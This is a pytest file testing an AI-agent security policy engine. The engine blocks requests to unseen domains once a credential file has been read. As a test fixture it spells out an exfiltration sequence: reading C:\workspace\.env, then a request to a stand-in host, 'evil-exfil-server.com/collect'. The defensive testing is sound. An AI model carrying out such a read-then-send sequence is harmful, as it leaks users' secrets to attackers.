from __future__ import annotations

import pytest
from agent_blackbox.config import BlackboxConfig
from agent_blackbox.security.policy import PolicyEngine


def test_sequence_rule_blocks_unseen_domain_after_sensitive_read():
    cfg = BlackboxConfig(mode="enforce")
    engine = PolicyEngine(cfg)

    # 1. Early in session: call trusted domain (recorded in seen_domains)
    dec1 = engine.evaluate_call("http_request", {"url": "https://api.github.com/repos/test"})
    assert dec1.allowed
    assert not dec1.is_blocked

    # 2. Agent reads sensitive credential file
    dec2 = engine.evaluate_call("read_file", {"path": r"C:\workspace\.env"})
    # read_file itself may or may not be blocked by specific path rules, but it registers as sensitive
    assert "C:\\workspace\\.env" in engine.sequence_tracker.sensitive_files_accessed

    # 3. Request to domain seen earlier is PERMITTED
    dec3 = engine.evaluate_call("http_request", {"url": "https://api.github.com/issues"})
    assert dec3.allowed
    assert not dec3.is_blocked

    # 4. Request to an UNSEEN domain after sensitive read is BLOCKED
    dec4 = engine.evaluate_call("http_request", {"url": "https://evil-exfil-server.com/collect"})
    assert not dec4.allowed
    assert dec4.is_blocked
    assert dec4.severity == "CRITICAL"
    assert "Sequence violation" in dec4.reason
    assert "evil-exfil-server.com" in dec4.reason


def test_sequence_rule_permits_new_domains_before_sensitive_read():
    cfg = BlackboxConfig(mode="enforce")
    engine = PolicyEngine(cfg)

    # Reading a normal non-sensitive file
    engine.evaluate_call("read_file", {"path": "README.md"})
    assert len(engine.sequence_tracker.sensitive_files_accessed) == 0

    # Querying a domain before any sensitive read is permitted
    dec = engine.evaluate_call("http_request", {"url": "https://weather-api.com/v1/forecast"})
    assert dec.allowed
    assert not dec.is_blocked
    assert "weather-api.com" in engine.sequence_tracker.seen_domains
